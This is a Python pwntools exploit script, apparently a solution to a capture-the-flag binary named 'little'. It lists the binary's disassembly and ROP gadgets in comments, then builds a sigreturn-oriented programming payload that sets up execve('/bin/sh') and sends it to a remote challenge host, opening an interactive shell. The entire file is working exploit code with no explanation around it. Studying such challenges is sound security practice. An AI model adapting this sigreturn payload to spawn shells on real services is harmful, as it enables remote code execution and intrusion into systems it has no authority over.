#!/usr/bin/env python3
from pwn import *
'''
binary
  0x0000000000401000 <+0>:     push   rsp
  0x0000000000401001 <+1>:     pop    rsi
  0x0000000000401002 <+2>:     push   0x0
  0x0000000000401004 <+4>:     push   0x0
  0x0000000000401006 <+6>:     pop    rdi
  0x0000000000401007 <+7>:     pop    rax
  0x0000000000401008 <+8>:     mov    edx,0x800
  0x000000000040100d <+13>:    syscall
  0x000000000040100f <+15>:    ret
  0x0000000000401010 <+16>:    nop
  0x0000000000401011 <+17>:    ret
'''
'''
gadget
0x000000000040100b : add byte ptr [rax], al ; syscall
0x0000000000401009 : add byte ptr [rax], cl ; add byte ptr [rax], al ; syscall
0x0000000000401005 : add byte ptr [rdi + 0x58], bl ; mov edx, 0x800 ; syscall
0x0000000000401008 : mov edx, 0x800 ; syscall
0x0000000000401010 : nop ; ret
0x0000000000401007 : pop rax ; mov edx, 0x800 ; syscall
0x0000000000401006 : pop rdi ; pop rax ; mov edx, 0x800 ; syscall
0x0000000000401004 : push 0 ; pop rdi ; pop rax ; mov edx, 0x800 ; syscall
0x000000000040100f : ret
0x000000000040100d : syscall
'''

exe = './little'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

binsh = 0x402000
pop_rax_movEdx_syscall = 0x401007# pop rax ; mov edx, 0x800 ; syscall
syscall = 0x40100d
rax_sigreturn = 0xf
rax_execve = 0x3b

io = remote('host1.metaproblems.com', 5460)

frame = SigreturnFrame()
# execve('/bin/sh', 0, 0)
frame.rip = syscall
frame.rax = rax_execve
frame.rdi = binsh
frame.rsi = 0x0   # NULL
frame.rdx = 0x0   # NULL

payload = flat({
  0: [
  # call sigreturn
  pop_rax_movEdx_syscall,
  rax_sigreturn,
  # control register
  frame,
  ]
})

io.sendline(payload)
io.interactive()